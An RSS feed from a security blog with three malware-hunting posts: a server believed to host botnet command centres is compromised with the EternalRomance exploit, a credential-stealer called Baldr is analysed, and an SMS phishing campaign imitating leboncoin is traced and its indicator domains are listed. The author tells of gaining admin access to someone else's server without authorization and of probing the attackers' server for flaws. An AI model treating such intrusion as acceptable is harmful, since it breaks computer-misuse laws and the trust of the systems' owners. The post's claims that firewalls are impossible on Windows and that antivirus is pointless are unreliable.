<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>Malware-Hunting &#8211; ~# Hackonch !</title>
	<atom:link href="https://hackonch.ml/category/malware-hunting/feed/" rel="self" type="application/rss+xml" />
	<link>https://hackonch.ml</link>
	<description>Security rhymes with Liberty</description>
	<lastBuildDate>Sun, 15 Sep 2019 18:36:25 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.2.2</generator>

<image>
	<url>https://hackonch.ml/wp-content/uploads/2019/08/f56f9-favicon-1-150x150.png</url>
	<title>Malware-Hunting &#8211; ~# Hackonch !</title>
	<link>https://hackonch.ml</link>
	<width>32</width>
	<height>32</height>
</image> 
	<item>
		<title>How to take control of a dozen Russian botnets by mistake</title>
		<link>https://hackonch.ml/malware-hunting/how-to-take-control-of-a-dozen-russian-botnets-by-mistake/</link>
				<pubDate>Fri, 30 Aug 2019 02:13:30 +0000</pubDate>
		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
				<category><![CDATA[Fun]]></category>
		<category><![CDATA[Malware-Hunting]]></category>

		<guid isPermaLink="false">https://hackonch.ml/?p=1723</guid>
				<description><![CDATA[<div class="post-excerpt">Hi everyone, Before to start, I would like to use a bit of my little notoriety to write you a small poem I&#8217;ve made especially for the occasion: Roses are&#8230;</div>
<div class="post-more"><a href="https://hackonch.ml/malware-hunting/how-to-take-control-of-a-dozen-russian-botnets-by-mistake/" class="btn btn-primary btn-effect btn-lg"><span>View Post</span><span><i class="icon icon-arrow-right"></i></span></a></div>
<p>The post <a rel="nofollow" href="https://hackonch.ml/malware-hunting/how-to-take-control-of-a-dozen-russian-botnets-by-mistake/">How to take control of a dozen Russian botnets by mistake</a> appeared first on <a rel="nofollow" href="https://hackonch.ml">~# Hackonch !</a>.</p>
]]></description>
								<content:encoded><![CDATA[
<p>Hi everyone,</p>



<p>Before to start, I would like to use a bit of my little notoriety to write you a small poem I&#8217;ve made especially for the occasion:</p>



<p style="text-align:center"><em>Roses are red<br>Violets are blue<br>I&#8217;m not responsible<br>if the Russian Mafia comes to you !</em></p>



<p>That being said, we can finally start!</p>



<h3>#1 The context </h3>



<p>[IP ADDRESS] &#8211; [07/Apr/2019: 18: 01: 28 +0100] &#8220;\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash = Admin&#8221; 200 173 &#8220;-&#8220;&#8221;-&#8220;</p>



<p>As any good article, this one starts with a strange line. As we can see, the query is quite different from the classic ones:</p>



<p>[ADDRESS_IP] &#8211; [07/Apr/2019: 18: 01: 28 +0100] &#8220;/index.html&#8221; 200 18 &#8220;-&#8221; &#8220;-&#8220;</p>



<p>This difference could essentially means two things: either the request is malformed or it&#8217;s an attack.</p>



<p>The web server is managed by a friend, he asks me my opinion about the issue because he was quite intrigued by the response code &#8220;200&#8221; in the end wich means the request has been successful.</p>



<p>The thing is, if the request was malformed, it would never have had well-formed characters because it is precisely malformed. It was clear to me that this was an attack. Probably a mass attack, but still an attack.</p>



<h3>#2  A bit of information gathering </h3>



<p>I&#8217;ve started by searching some informations about the attacker&#8217;s IP address because it was basically all we had at this stage. For some reason this mysterious address was located in Russia ü§†üá∑üá∫</p>



<p>Nevertheless it wasn&#8217;t reported on public abuse IP lists and when we query out the IP, the server proudly display a IIS8 default website:</p>



<figure class="wp-block-image"><img src="https://i.imgur.com/FA9ZPYF.png" alt=""/><figcaption>It must be said, the default IIS8 website looks great  ü§†</figcaption></figure>



<p>Just out of curiosity I ran a light ports scan to know which services would be running. This would help me to have a small idea on ‚Äã‚Äãthe server&#8217;s role.</p>



<p>Here is the result of the scan:</p>



<pre class="wp-block-preformatted">Starting at 2019-04-08 20:49 UTC
Nmap scan report for [IP_ADDRESS]
Host is up (0.019s latency).
Not shown: 989 closed ports
PORT     STATE    SERVICE       VERSION
135/tcp  open     msrpc?
139/tcp  filtered netbios-ssn
445/tcp  open     microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1025/tcp open     tcpwrapped
1026/tcp open     LSA-or-nterm?
1027/tcp open     msrpc         Microsoft Windows RPC
1028/tcp open     unknown
1029/tcp open     ms-lsa?
1030/tcp open     iad1?
1031/tcp open     unknown
1034/tcp open     zincite-a?
3389/tcp open     ms-wbt-server Microsoft Terminal Service
Service Info: OSs: Windows Server 2008 R2 - 2012, Windows; CPE: cpe:/o:microsoft:windows
</pre>



<h3>#3  The &#8220;Hack Back&#8221; </h3>



<p>In the vocabulary of cyber warfare there&#8217;s this word that comes up quite often and was popularized by the Active Cyber Defense Bill. This Bill stipulated, among other things, that the United States may reserve the right to perform a &#8220;Hack Back&#8221; if an institution is targeted by a cyber attack  </p>



<p>But what does this word mean concretely?</p>



<p>In fact it&#8217;s easy as pie, it&#8217;s when the victim successfully returns the attack against its author (who is usually totally caught off guard at that moment). On the morale of the attacker, a Hack Back is as devastating as unforeseen.</p>



<p>Why am I talking about Hack Back ? Back to the results of the scan, there&#8217;s a significant amount of active services on this server including one that has particularly wreaked havoc within a company in a previous article (<a href="https://hackonch.ml/fun/how-to-lose-your-information-system-on-a-print-server/index.html">here</a>)</p>



<p>You may guessed it if you follow me, I&#8217;m talking about:</p>



<pre class="wp-block-preformatted">445/tcp open Microsoft microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds </pre>



<p>This is Samba, which live on port 445 by default and is used primarily for file sharing between multiple computers. For instance, it&#8217;s thanks to samba that we can do this:</p>



<div class="wp-block-image"><figure class="aligncenter"><img src="https://i.imgur.com/FO9fc84.png" alt=""><figcaption>One Ring to rule them all, One Ring to find them,<br>
One Ring to bring them all and in the darkness bind themüíç</figcaption></figure></div>



<p>Unfortunately, since 2017, Samba is also known to be particularly vulnerable. For example, with the flaw named &#8220;EternalBlue&#8221;, we can crash a Windows executing an old version of Samba:</p>



<div class="wp-block-image"><figure class="aligncenter"><img src="https://i.imgur.com/l2yzFXs.png" alt=""><figcaption>I didn&#8217;t miss this good old BSOD ü§†</figcaption></figure></div>



<p>Another more useful example is the &#8220;EternalRomance&#8221; vulnerability that allows an attacker to take control of a computer if Samba is outdated.</p>



<p>You know, sometimes in movies there&#8217;s that moment when there&#8217;s a freeze frame with a voice-over telling something like: It was at this moment that everything f*cked up ! Well, here we are, it was at this precise moment that everything f*cked up !</p>



<p>I was just going to run a last scan just to report the IP. Absolutely truthful fact, I misstyped the script path and I lauched inadvertently the EternalRomance exploit wich ended up with this result:</p>



<figure class="wp-block-image"><img src="https://i.imgur.com/zo4jcvO.png" alt=""/></figure>



<div class="wp-block-image"><figure class="aligncenter"><img src="https://media.giphy.com/media/swrTFeuOt2v6g/giphy.gif" alt=""/><figcaption>Wait what ?!</figcaption></figure></div>



<p>For those who may be not familiar with Metasploit, it seems that the EternalRomance attack allowed me to have access to the adminitrator&#8217;s session. I was quite surprised, honestly, I didn&#8217;t really expect to break into a Russian hacker&#8217;s control and command server !</p>



<p>It must be said that, even if I was terribly excited, I was also a little bit scared, because I&#8217;ve entered into the wolf&#8217;s lair.</p>



<p>To get more confortable, I took a &#8220;screenshot&#8221; with the command of the same name:</p>



<figure class="wp-block-image"><img src="https://i.imgur.com/XMLAw7o.jpg" alt=""/><figcaption>Oh! So that&#8217;s what the behind the scenes looks like? üòÆ</figcaption></figure>



<p>As can be seen in the screenshot, the host is likely to used as a control and command center (C&amp;C) for several botnets. In any case, this hypothesis could explain the presence of so many open ports during the previous port scan.</p>



<p>If we assume that there&#8217;s a control center on each open port, it would mean that this server controls a total of 8 botnets (listening on ports 1025,1026,1027,1028,1029,1030,1031 and 1034). Indeed, it could make sense because listening ports are following each other and it&#8217;s rare enough to be highlighted.</p>



<p>Anyway, at this point, we had enough control over the server to shutdown all the botnets once for all. Indeed, the malicious softwares used by the Russian hacker has a feature that can completely remove the infected host from the botnet. Applied to all infected hosts would definitely result in the simple and permanent dismantling of all botnets controlled by the server.</p>



<div class="wp-block-image"><figure class="aligncenter"><img src="https://media.giphy.com/media/eoxomXXVL2S0E/giphy.gif" alt=""></figure></div>



<p>We simply chose with my friend to don&#8217;t do it. </p>



<div class="wp-block-image"><figure class="aligncenter"><img src="https://media.giphy.com/media/xTk9Zxw5LoEOuCLCQE/giphy.gif" alt=""><figcaption>Your reaction at that moment ü§†</figcaption></figure></div>



<p>Indeed, turning off 8 botnets among all the variety of botnets on the Internet would be like taking a water glass off the ocean. In addition, the hacker could always redo other botnets elsewhere. </p>



<p>And then, even if the act could seem praiseworthy at first glance, there&#8217;s this little note that makes it even reprehensible: <a href="https://en.wikipedia.org/wiki/Computer_Fraud_and_Abuse_Act">The Computer Fraud and Abuse Act.</a></p>



<p>Since we are not empowered by the nation to respond, the best thing to do was to simply report the infraction to the appropriate authorities. </p>



<p>However, it should be noted that, even if we had reported the infraction 4 months ago, the server is still running and operational (hence the censorship of IP addresses to prevent any Shadow Brokers wannabes).</p>



<figure class="wp-block-image"><img src="https://i.imgur.com/uYegwDo.png" alt=""/><figcaption>At least, the server is now indexed by Shodan</figcaption></figure>



<h3> Conclusion </h3>



<p>I may repeat myself but I find it really damaging that the legal process is so burdensome. If a sort of law provision could be issued to legalize the *ethical* Hack Back and not &#8220;pre-textual&#8221; as in the Active Cyber Defense Bill, I honestly think that it would be a considerable step forward in our hyper connected societies where the violations of our privacy are too often common.</p>



<p>Seriously, just imagine a world, where the bad hackers would no longer be predators but prey. Imagine a world where spreading chaos and desolation over information systems only because it&#8217;s stylish to do so is no longer stylish. Imagine a world where xXdathackerXx would no longer attack Darbix62&#8217;s internet connection on Minecraft only because I quote &#8220;Yea I&#8217;m a real ononymous, yesterday, I hacked my middle school website so stfu&#8221; dixit the person who has simply overloaded his own connection.</p>



<p>I dream of a world like this ! Anyway, until this world becomes reality, you can still share the article if you liked it, it&#8217;s pretty important. You can also follow me on twitter to miss don&#8217;t miss anything !</p>



<p>In the meantime, stay well, be kind to your domestic plankton and see you soon !</p>
<p>The post <a rel="nofollow" href="https://hackonch.ml/malware-hunting/how-to-take-control-of-a-dozen-russian-botnets-by-mistake/">How to take control of a dozen Russian botnets by mistake</a> appeared first on <a rel="nofollow" href="https://hackonch.ml">~# Hackonch !</a>.</p>
]]></content:encoded>
										</item>
		<item>
		<title>Baldr or how to get pwned for cheating on fortnite</title>
		<link>https://hackonch.ml/malware-hunting/baldr-or-how-to-get-pwned-for-cheating-on-fortnite/</link>
				<pubDate>Wed, 14 Aug 2019 23:37:23 +0000</pubDate>
		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
				<category><![CDATA[Malware-Hunting]]></category>

		<guid isPermaLink="false">https://hackonch.ml/?p=1437</guid>
				<description><![CDATA[<div class="post-excerpt">Hi everyone, Do you know Baldr? No ? Let me rephrase my question. Do you cheat on games like Counter Strike, Apex Legends, PUBG or in a nutshell on any&#8230;</div>
<div class="post-more"><a href="https://hackonch.ml/malware-hunting/baldr-or-how-to-get-pwned-for-cheating-on-fortnite/" class="btn btn-primary btn-effect"><span>View Post</span><span><i class="icon icon-arrow-right"></i></span></a></div>
<p>The post <a rel="nofollow" href="https://hackonch.ml/malware-hunting/baldr-or-how-to-get-pwned-for-cheating-on-fortnite/">Baldr or how to get pwned for cheating on fortnite</a> appeared first on <a rel="nofollow" href="https://hackonch.ml">~# Hackonch !</a>.</p>
]]></description>
								<content:encoded><![CDATA[<p>Hi everyone, </p>
<p>Do you know Baldr? No ? Let me rephrase my question. Do you cheat on games like Counter Strike, Apex Legends, PUBG or in a nutshell on any other popular games ?</p>
<p>If the answer is yes, well, you have to consider your house being the next target of the Area 51 facebook storm group because it&#8217;s due to people of your kind that I just can&#8217;t manage to get Prestige 70 on Cole Off Douty Modern Advanced Warfare 3 !! </p>
<p>Well, more seriously, you have to know that some quacks have managed to make profit of cheaters by making a botnet essentially composed of&#8230; cheaters !</p>
<h3>1 ¬∞) The infection </h3>
<p>To spread their virus, the Baldr team has decided to make quite credible videos to cheat on a whole bunch of games, the whole uploaded on our beloved Youtube. You know, this same Youtube that did the &#8220;spring-cleaning&#8221; recently by deleting a whole bunch of hacking related videos. Irony of fate or real stroke of genius, their videos are still online on YouTube even after this so-called and so contested cleansing. Since they don&#8217;t do things in half, they also advertised their videos on Discord mainly to attract <del>cheaters</del> gamers.</p>
<p>These videos are posted from several accounts and they all have a link in the description. The link leads to an archive, which once unzipped and injected into the game&#8217;s files, can actually permit to cheat on the game, either by shooting faster or by seeing the enemies through the walls.</p>
<p>Well, that was the funny part or as I like to call it &#8220;the immersed part of the iceberg&#8221;. Let&#8217;s now see the submerged one, namely the less fun part.</p>
<h3>2 ¬∞) The submerged part of the iceberg</h3>
<p><center><img src="https://i.imgur.com/nspthUt.png" alt="price" ><figcaption>Not expensive at all ü§†</figcaption></center></p>
<p>Yes, as you see, Baldr steals all the passwords on the computer, including passwords that has been stored by the browser or by any other applications (such as Discord or FileZilla for instance) and then send them to the hacker who will eventually sell every account for a few dollars on the Dark Net. </p>
<p><center><img src="https://i.imgur.com/5yQGWvB.jpg" alt="and it's not over" ><figcaption>And it&#8217;s not over !</figcaption></center></p>
<p>Baldr turns also your PC into a well-docile zombie that will attack other computers with your Internet connection ! Oh, I see the crowd starting to make a fuss ! Unfortunately, this is still the best case, because your beloved Internet connection can also be rented, at prices that would get sick any Internet Service Provider, as an anonymous proxy or even worse, as a tor hidden service.</p>
<p>Oh I almost forgot the classic and the inevitable cryptocurrency mining !! Yeah, because even CPU usage is profitable to Baldr.</p>
<h3> 3 ¬∞) The origins </h3>
<p>So where does this evil beast come from? At first sight, it seems that Baldr was sold for the first time on underground forums hosted in Russia. </p>
<p>But, is Baldr really the sordid invention of Russian pirates? That&#8217;s another question.</p>
<p><center><img src="https://i.imgur.com/VjQqbNl.png" alt="stats" /><figcaption> Some cool stats ü§†</figcaption></center> </p>
<p>Indeed, when we sit down and look for ten seconds the statistics of infections, we realize that Indonesia won the race with 21.85% against 14.14% for Brazil and it is only at the third place that Russia appears with <strong>*only*</strong> 13.68%. </p>
<p>Moreover, the code does not contain any sign of Cyrillic characters, everything is coded in a perfect English. There are also many similarities with other abominations of that kind like Azorult or GrandStealer because we can even talk about copy-paste</p>
<p><center><img src="https://i.imgur.com/uUjnkUC.png" alt="comparison" /><figcaption>Left: Azorult NetscapeToJSON cookie converter function, Right: Baldr NetscapeToJSON cookie converter function ü§† </figcaption></center></p>
<p>And here is the icing on the cake: the software vendors has sent a note the May 31st to all customers in which they explain that the developer decided to stop the project. But rather than maintain themselves the software, these gentlemen kindly call their customers (mainly Russian by the way) to look for a replacement.</p>
<p><center><img src="https://i.imgur.com/XK2ny0Q.png" alt="note" /><figcaption>The mysterious note from Baldr vendors</figcaption></center></p>
<h3> 4 ¬∞) What is Baldr concretely? </h3>
<p>For me, Baldr belongs to a well-defined category of malware that I like to define with the following definition:</p>
<p>threat.exe: (mass name) Malware targeting <strong> *only* </strong> Windows, which is not very sophisticated but is still massively spreaded / used, thanks to &#8220;cyberkiddos&#8221; on ¬´¬´¬´hackers¬ª¬ª¬ª forums (please note the quotation marks)</p>
<p>Yes, I&#8217;m about to break a myth, when we search a little bit on this kind of threat we generally reach the moment when we listen to a tutorial on how to build a genuine Russian botnet. The fact is, I quickly realized that the most of the time, the person talking is quite rarely more than 14 years old and tends to make videos on Roblox with all of its friends on its YouTube channel.</p>
<p><center><img src = "https://i.imgur.com/BoPbgjN.jpg" alt = "Oouuuh"><figcaption> Run for your lives !!! Here is the new generation of cybercriminals !!!! ü§†</figcaption></center></p>
<h3> 5 ¬∞) How to protect yourself + How to know if you are infected? </h3>
<p>Most of the time, when I&#8217;m dealing with these &#8220;threats.exe&#8221; many peoples tell me that I actually didn&#8217;t say how to protect ourselves or at least how to detect the infection. I&#8217;ll use this post to answer once and for all:</p>
<p><center><img src="https://i.imgur.com/Kamy9Dw.jpg" alt="true" /><figcaption></figcaption></center></p>
<p>I know, this is not the expected answer coming from a cybersecurity professional but this is the sad trust. Windows is a real colander, Windows 10 may be a more modern collander but a still a collander bloated and bugged as heck.</p>
<p><center> <img src = "https://i.pinimg.com/564x/ab/55/45/ab5545fba7c959d690d898f94cc70ecb--friday-humor-windows-.jpg" alt = "the same ones speak for themselves"><figcaption> memes talk by themselves ü§†</figcaption></center> </p>
<p>Security is a completely ABSENT concept on Windows, updates are a real clusterfuck, there is still a lot of Windows perfectly updated which are still prone to be exploited to vulnerabilities patched for ages <strong> <em> #Eternalblue </em> </strong>.</p>
<p>The very concept of antivirus, is a real aberration! If a system is well done, it is well done, that&#8217;s all. There is no need to fill any gap in its security.</p>
<p>Finally, I don&#8217;t know for you, but when I buy a tire for example, I don&#8217;t have to buy a coating to seal any hole on the tire ? Or I&#8217;ve been definitely fooled by a quack !</p>
<p>That was for the protection, the detection now! On Windows, you may not know it, but when you simply &#8220;listen&#8221;, with no open program, what your Windows sends on the Internet, you end up with this after only 30 seconds:<br />
<center> <img src = "https://i.imgur.com/9R8pfPv.png" alt = "capture"></center></p>
<p>This is a network capture made with Wireshark, an open source software. We can see on this frame capture that all in pale green or dark gray is all the communications your Windows has established with Microsoft telemetry servers.</p>
<p>On paper, telemetry allows Microsoft to know how you use your Windows. Of course, you are supposed to know what it is because during the installation of Windows, Microsoft actually asked your permission, but it&#8217;s absolutely normal that you have accepted because if you had refused, the installation would be aborted.</p>
<p>Microsoft simply violates your privacy with your permission.</p>
<p>Establishing a system that would filter all transmissions and that would drop suspicious transmissions (so, as a firewall) is simply impossible on Windows, it&#8217;s for this reason that no antivirus vendor has ever tried the maneuver. This is also why we never put firewalls on Windows clients, otherwise they don&#8217;t connect to Internet.</p>
<p><H3> Conclusion </h3>
<p>All of this to say once and for all that if you&#8217;re tired of your computer being abused by 13 year-olded kids or web giants, you can simply look for the alternative that suits your needs. I could also make it the subject of a future article if it interest you.</p>
<p>Voil√†, I hope you like this article. Do not hesitate to share it with your friends or colleagues! </p>
<p>Don&#8217;t forget to be happy, it&#8217;s the most important and see you soon!<br />
<center> <img src = "https://i.imgur.com/I0kk5xx.jpg" alt = "final"></center></p>
<p>The post <a rel="nofollow" href="https://hackonch.ml/malware-hunting/baldr-or-how-to-get-pwned-for-cheating-on-fortnite/">Baldr or how to get pwned for cheating on fortnite</a> appeared first on <a rel="nofollow" href="https://hackonch.ml">~# Hackonch !</a>.</p>
]]></content:encoded>
										</item>
		<item>
		<title>Investigation: Russian phishing campaign via text messages on leboncoin</title>
		<link>https://hackonch.ml/malware-hunting/investigation-russian-phishing-campaign-via-text-messages-on-leboncoin/</link>
				<comments>https://hackonch.ml/malware-hunting/investigation-russian-phishing-campaign-via-text-messages-on-leboncoin/#comments</comments>
				<pubDate>Fri, 21 Jun 2019 04:57:17 +0000</pubDate>
		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
				<category><![CDATA[Malware-Hunting]]></category>

		<guid isPermaLink="false">https://blog.tchernobyl.ml/?p=1061</guid>
				<description><![CDATA[<div class="post-excerpt">Hi everyone, If I tell you: massive phishing campaign, Russian botnet, AndroidBanker and Leboncoin (a sort of French Ebay) you do think about ? If you answered loudly (or not)&#8230;</div>
<div class="post-more"><a href="https://hackonch.ml/malware-hunting/investigation-russian-phishing-campaign-via-text-messages-on-leboncoin/" class="btn btn-primary btn-effect"><span>View Post</span><span><i class="icon icon-arrow-right"></i></span></a></div>
<p>The post <a rel="nofollow" href="https://hackonch.ml/malware-hunting/investigation-russian-phishing-campaign-via-text-messages-on-leboncoin/">Investigation: Russian phishing campaign via text messages on leboncoin</a> appeared first on <a rel="nofollow" href="https://hackonch.ml">~# Hackonch !</a>.</p>
]]></description>
								<content:encoded><![CDATA[<p>Hi everyone,</p>
<p>If I tell you: massive phishing campaign, Russian botnet, AndroidBanker and Leboncoin (a sort of French Ebay) you do think about ?</p>
<p>If you answered loudly (or not) &#8220;HELL YEAH !!!&#8221; You got it ü§†</p>
<p>The Internet is vast and full of mysteries. And it&#8217;s precisely this mysterious side that fascinates me. So you understand that when I get an express ticket to the behind the scenes of an attack (especially like this one) I don&#8217;t think twice!</p>
<h3> 1¬∞) The Context </h3>
<p>Recently one of my friends offered for sale an object on the leboncoin. Later, about a couple of days, he received a text message to notify him that he did received the prepayment for the sale.</p>
<pre>[name_of_my_friend], I sent you the prepayment www-leboncoin.com/357143040654321870 </pre>
<p>Before writing this article I tried to see if we talked about it elsewhere, and you can also check it, there is only the UFC forum (a French association for the protection of consumer rights) and a Tweet of benkow_ .</p>
<blockquote class="twitter-tweet">
<p lang="en" dir="ltr"> hxxp:// cd78cg210xy0[.]com/3lfk3jGj/admindo/login.php Android SMS Loader. Was this review helpful? (Apk) targeting french people last week <a href="https://t.co/For7hvRUKX"> https://t.co/Frn7hvRUKX </a> <a href="https://t.co/5M1MGryN9T">pic.twitter.com/5M1MGryN9T </a> </p>
<p> &#038; mdash; Benk√∏w mo ûu∆éq (@benkow_) <a href="https://twitter.com/benkow_/status/1082229806190731265?ref_src=twsrc%5Etfw"> January 7, 2019 </a> </p></blockquote>
<p>Once the link in the text message is opened, a page similar to the one on the benkow_&#8217;s tweet is displayed. Of course, the content can&#8217;t be displayed if we obviously don&#8217;t download the &#8220;app&#8221;. And then, as if to signify the excitement of the attacker, the mistakes of spelling are multiplying up to the drama &#8230;</p>
<p>Most users who get caught by this hideous scam are saved thanks to this screen:</p>
<p>¬†<center><img src="https://www.pronosoft.com/en/appli/android/msg.png" /></center></p>
<p>Or thanks to that one for the less concerned:</p>
<p>¬†<center><img src="https://img1.koplayer.com/ScreenShot/com.antivirus/corwdYPO6EJ0GSM0-KSfKDDvF6aleCuEP93xqz2MryFdh7A3dKbupAcbMfoTZnKQ3jxc_50.png" /></center></p>
<p>Yup! Although unsettling on many points, this campaign falls apart because many have received the message but only a few have tried everything to have the little .apk file installed on their device.</p>
<h3> 2¬∞) The payload (the .apk file) </h3>
<p>The file is very light (for an application ü§†), not more than 300 KB.<br />
As soon as it&#8217;s executed, the fake app will connect to the fake site so that the victim can enter their bank details (bye bye to all the bucks).</p>
<p>Once done, a direct connection with the Control and Command (C2C) server will take place and via a file &#8220;gate.php&#8221;, the server gives the zombie a kind of mutex (basically an identifier, eg: 543759810537698240).</p>
<p>And this is where it gets funny:</p>
<p>The authors seem to have initially planned to deal with an android botnet via HTTP totally submissive and dedicated to its C2C (Control and Command server). The thing is that on Android, there isn&#8217;t a real way of persistence compaired to the other systems.</p>
<p>For example, the app permissions are chosen by the user during the installation and even all are enabled, there is no guarantee that the daemon (the application service) will launch properly when the device reboots.</p>
<p>Not to mention the fact that a mobile phone rarely stays in the same place (logical at the same time). The Internet connection won&#8217;t work all the time or at least will engage some salty costs to the victim if the device is infected (especially if the victim is a proletarian with a small Internet budget ü§†)</p>
<p>But don&#8217;t worry, on this side the authors had a genius idea to spread the malware (yup, really). You want a clue ? Here are the permissions:</p>
<p>android.permission.CALL_PHONE<br />
android.permission.CHANGE_WIFI_STATE<br />
android.permission.GET_TASKS<br />
android.permission.INTERNET<br />
android.permission.READ_PHONE_STATE<br />
android.permission.READ_SMS<br />
android.permission.RECEIVE_SMS<br />
android.permission.SEND_SMS<br />
android.permission.SYSTEM_ALERT_WINDOW<br />
android.permission.BIND_ACCESSIBILITY_SERVICE<br />
android.permission.ACCESS_NETWORK_STATE<br />
android.permission.ACCESS_WIFI_STATE<br />
android.permission.CHANGE_NETWORK_STATE<br />
android.permission.REAL_GET_TASKS<br />
android.permission.RECEIVE_BOOT_COMPLETED<br />
android.permission.USES_POLICY_FORCE_LOCK<br />
android.permission.VIBRATE<br />
android.permission.WAKE_LOCK<br />
android.permission.WRITE_SETTINGS </p>
<p>Well I admit it&#8217;s not exatraordinary stuff, given that it&#8217;s some basic backdoor permissions &#8230; except for a tiny detail. The kind of tiny details that are zapped on the moment but once retrieved it would make you say &#8220;Great Scott!&#8221;</p>
<p><center><img src="https://media1.tenor.com/images/e0cb7e6a71710790fea998bd723f85a9/tenor.gif" /></center></p>
<p>Indeed, when I conducted my investigation with my friend (thank you mate !), we came across this <a href="https://forum.quechoisir.org/prepaiement-leboncoin-arnaque-t202367.html" rel="noopener noreferrer" target="_ blank"> topic </a> of the UFC forum that choose</p>
<p>it&#8217;s more precisely this passage which interests us:</p>
<p>&#8220;I contacted the person who has sent me this text message, she answered me but she told she was harassed by people phone calling as me !&#8221; She had managed to install the .apk where she was asked to provide her banking details to finalize the prepayment !! &#8221;</p>
<p>When we read that, we say &#8220;Of course that the sender has managed to install the .apk because she&#8217;s the vilain ! In addition to that: &#8220;too funny the attacker is harassed by its own victims #so_much_lol!!!&#8221;</p>
<p>Yup but nope! Do you remember the identifier generated by the &#8220;gate.php&#8221; file on the fake site? And the identifier in the URL of the SMS sent to the victim?</p>
<p>As you&#8217;ve probably guessed it, the text message received by the victim was actually sent by&#8230; another victim and without his/her knowledge!</p>
<p>And that&#8217;s genius. Indeed, rather than sending the phishing SMS themselves and thus leaving some traces, the authors have used the  backdoored devices to relay messages to the potential victims. They have just invented an incognito mode for text messages !!</p>
<p>The only glitch in this genius technique is it seems that the hackers have misapplied their idea. Indeed, The fact that the sender of the famous phishing message is harassed, indicates clearly that the hacker&#8217;s manner to procedd is quite ill thought-out. Which is rather paradoxical when we see the real arsenal deployed for this campaign being worthy of the largest groups of cybercriminals, </p>
<p>To better illustrate my words let me make a list:</p>
<h4> Arguments to prove that hackers are in fact script-kiddies: </h4>
<p><Ul></p>
<li> ALL viruses linked to this organization are detected by a vast majority of antivirus </li>
<li> The TLS certificates are quickly self-signed and thus poorly signed (Ex: &#8220;CN: dddddddd fdfd&#8221; for the leboncoin backdoor) whereas they have thousands of registered domains </li>
<li> Authors only and *exclusively* target two platforms: Windows and Android, one would almost believe they only know these two operating systems ü§† </li>
<li> Some pieces of code are copied and pasted from StackOverflow, Github (less the credits) and even Pastebin </li>
<li> It&#8217;s actually quite easy to get acess to their Control and Command server </li>
<li> Some of their viruses are real &#8220;call centers&#8221; with more than a hundred different IP addresses contacted within the first seconds of execution </li>
<li> They use Virus Total to see if their backdoors are detected by antivirus </li>
<p></Ul></p>
<h4> Now some points that, I must admit, show the &#8220;determined&#8221; nature of the individuals: </h4>
<p><Ul></p>
<li> Many *too many* servers (mostly Russian, by the way) </li>
<li> Genuine malware versioning management </li>
<li> Use and implementation of cryptographic functions (especially RSA) </li>
<li> Attack exportation (first in Russia, then in China and recently in France with the leboncoin episode) </li>
<li> Huge (thousands) of domain names registered in less than 6 months (mostly for phishing purposes) </li>
<li> Portability of the control infrastructure (the IP/Web address changes pretty often) </li>
<li> They covered up their traces in the code (The seventh CIA developpement tradecraft is thus respected ü§†) </li>
<p></Ul></p>
<h5> Additional point: </h5>
<p>My friend and I, managed to find their control and command server. On the other hand, it didn&#8217;t look like anything else. The home page of the web server displayed a default Apache/CentOS page while the HTTP headers advertised Nginx very clearly. After a quick verification we found out that it was a version of Ubuntu serving Nginx.</p>
<p>Fooling around the server, we managed to find a flaw that allowed us to confirm that it was a totally custom solution. Anecdotally, we found some traces of previous installations over Internet (test?). Not functional but on two companies compromised sites (one American and the other one Indian).</p>
<h3> 3¬∞) Verdict </h3>
<p>This attack is definitely thought-provoking by its sophistication (perfect imporsonation of leboncoin, use of the new prepayment feature as a credible pretext for the operation, text messaging relay over victims to spread the malware,&#8230;). However, the attack does not shake or even outright the French plateform nor its users.</p>
<p>Honestly I&#8217;m almost prompted by pity for those individuals when I see all that good ideas and efforts to create their own solution to pwn the world. Unfortunately, it&#8217;s a flop. It&#8217;s the proof that crime does not pay ü§†</p>
<p><u> TELEX: </u> as a simple but effective countermeasure, just think about being more attentive to links before clicking directly.</p>
<h3>Bonus: the IOC&#8217;s of the campaign</h3>
<pre>
hxxp://gb-leboncoin[.]info
hxxp://uk-leboncoin[.]info
hxxp://uk-leboncoin[.]top
hxxp://gb-leboncoin[.]top
hxxp://www.m-leboncoin[.]info
hxxp://www.gb-leboncoin[.]top
hxxp://www.e-leboncoin[.]info
hxxp://www.u-leboncoin[.]info
hxxp://www.www-leboncoin[.]info
hxxp://www.e-leboncoin[.]top
hxxp://www.gb-leboncoin[.]info
hxxp://fr-leboncoin[.]top
hxxp://a-leboncoin[.]top
hxxp://t-leboncoin[.]info
hxxp://www.uk-leboncoin[.]info
hxxp://www.mob-leboncoin[.]info
hxxp://www.a-leboncoin[.]top
hxxp://leboncoin-ql[.]top
hxxp://fr-leboncoin[.]info
hxxp://mob-leboncoin[.]info
hxxp://www.uk-leboncoin[.]top
hxxp://u-leboncoin[.]info
hxxp://www.mob-leboncoin[.]top
hxxp://www.t-leboncoin[.]top
hxxp://m-leboncoin[.]info
hxxp://www.leboncoin-ql[.]top
hxxp://u-leboncoin[.]top
hxxp://od-leboncoin[.]info
hxxp://www.od-leboncoin[.]info
hxxp://www.fr-leboncoin[.]info
hxxp://www.t-leboncoin[.]info
hxxp://llc-leboncoin[.]top
hxxp://www.llc-leboncoin[.]top
hxxp://www.u-leboncoin[.]top
hxxp://www-leboncoin[.]info
hxxp://www.od-leboncoin[.]top
hxxp://t-leboncoin[.]top
hxxp://e-leboncoin[.]top
hxxp://od-leboncoin[.]top
hxxp://mob-leboncoin[.]top
hxxp://e-leboncoin[.]info
hxxp://www.fr-leboncoin[.]top
hxxp://leboncoin-xc[.]top
hxxp://a-leboncoin[.]info
